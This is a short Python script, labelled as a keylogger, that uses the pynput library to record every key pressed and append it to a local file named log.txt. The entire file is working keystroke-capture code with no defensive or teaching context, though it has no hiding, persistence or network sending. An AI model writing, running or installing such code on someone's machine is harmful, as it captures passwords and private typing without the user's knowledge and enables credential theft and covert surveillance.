#keylogger

from pynput.keyboard import Listener

def log_keys(key):
    key = str(key).replace("'"," ")
    with open('log.txt', 'a') as keylog:
        keylog.write(key + " \n")

def start_logging():
    with Listener(on_press=log_keys) as listener:
        listener.join()

if __name__ == "__main__":
    print('Keylogger is running.....')
    start_logging()
